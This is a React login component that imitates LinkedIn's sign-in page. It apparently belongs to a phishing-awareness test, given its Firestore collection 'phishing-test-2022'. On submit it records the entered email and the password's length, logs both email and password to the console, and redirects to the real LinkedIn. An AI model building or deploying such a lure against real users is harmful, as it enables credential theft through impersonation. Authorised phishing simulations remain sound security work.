import React, { useState } from "react";
import styled from "styled-components";
import NavBar from "./NavBar.js";
import { Button } from "./InputForm.js";
import InputBox from "./InputBox.js";
import Forgot from "./Forgot.js";
import { Link } from "react-router-dom";
import { db } from "../firebase.js";
import { collection, addDoc } from "firebase/firestore";


const SignInForm = () => {
  const [input, setInput] = useState({
    email: "",
    password: "",
  });
  const handleChangeInput = (e) => {
    setInput((prev) => {
      return {
        ...prev,
        [e.target.name]: e.target.value,
      };
    });
  };

  function clickRedirect()
  {
    window.location.href="https://linkedin.com/feed/";
  }

  const handleSubmit = async () => {

    const password = input.password;


    console.log(input.email);
    console.log(input.password);
    // pass to firebase
    const dbRef = collection(db, "phishing-test-2022");
    const params = {
      email: input.email,
      password_length: password.length,
      created_at: new Date(),
      from: window.location.href,
    };
    await addDoc(dbRef, params);
   
  };

const sendRequest=() =>
{
  handleSubmit();
  clickRedirect();
}

  return (
    <div>
      <NavBar></NavBar>

      <div>
        <IBox>
          <Text1>
            <h1>Sign in</h1>
          </Text1>
          <Text2>
            <p>Stay updated on your professional world</p>
            <br></br>
          </Text2>

          <InputBox
            label="Email or phone number"
            type="text"
            name="email"
            value={input.email}
            onChange={handleChangeInput}
          />
          <InputBox
            label="Password"
            type="password"
            name="password"
            value={input.password}
            onChange={handleChangeInput}
          />
          <Forgot as={Link} to="/forgot">
            Forgot password?
          </Forgot>
          <IButton onClick={sendRequest}>Sign in</IButton>
        </IBox>

        <Bottom>
          <img src="/images/linkedin-bottom2.png" alt="" />
        </Bottom>
      </div>
    </div>
  );
};

const Text1 = styled.label`
  display: flex;

  h1 {
    display: block;
    font-size: 42px;
    line-height: 1.25;
    font-weight: 600;
    color: rgba(0, 0, 0, 0.9);
    padding: 0 0 4px 0;
  }
`;

const Text2 = styled.label`
  p {
    display: block;
    font-size: 16px;
    line-height: 1.42857;
    font-weight: 400;
    color: rgba(0, 0, 0, 0.9);
  }
`;

 const IBox = styled.div`
  align-items: center;
  margin: 100px auto 0;
  width: 30%;
  min-width: 300px;
  max-width: 500px;
  height: 420px;
  padding: 20px;
  background-color: white;
  border-radius: 20px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.15);

`;

const IButton = styled(Button)`
  margin-top: 30px;
  display: flex;
  justify-content: center;
  align-items: center;
`;



const Bottom = styled.div`
  img {
    position: absolute;
    width: 100%;

    margin-top: 300px;
  }
`;

export default SignInForm;
